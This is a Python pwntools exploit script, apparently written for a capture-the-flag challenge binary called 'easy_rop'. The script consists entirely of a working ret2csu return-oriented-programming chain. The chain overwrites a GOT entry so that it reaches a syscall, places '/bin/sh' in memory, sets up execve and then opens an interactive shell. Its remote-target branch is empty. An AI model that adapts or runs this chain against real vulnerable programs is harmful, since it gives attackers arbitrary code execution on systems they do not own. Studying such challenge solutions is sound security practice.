from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./easy_rop")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./easy_rop")
else:
	pass

def debugf():
	gdb.attach(p,"b *0x400598")

def rop(target,p1,p2,p3):
	pop6_ret = 0x4005FA #rbx;rbp;r12;r13;r14;r15
	call_addr = 0x4005E0 # rdx<-r13;rsi<-r14;rdi<-r15;rdx == 0;call r12; rbp == 1
	payload = p64(pop6_ret)
	payload += p64(0) + p64(1) + p64(target) + p64(p3) + p64(p2) + p64(p1)
	payload += p64(call_addr)
	payload += p64(0) * 7 # junk
	return payload

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]

padding = 0x18 * "a"
payload = padding
read = elf.got["read"]
sleep = elf.got["sleep"]
bss_addr = 0x601040
rax = 0x3b
payload += rop(read,0,sleep,1)
payload += rop(read,0,bss_addr,rax)
payload += rop(sleep,bss_addr,0,0)
payload = payload.ljust(0x50F,"\x00")
p.send(payload)
p.send("\x05")
p.send("/bin/sh".ljust(rax,"\x00"))
p.interactive()
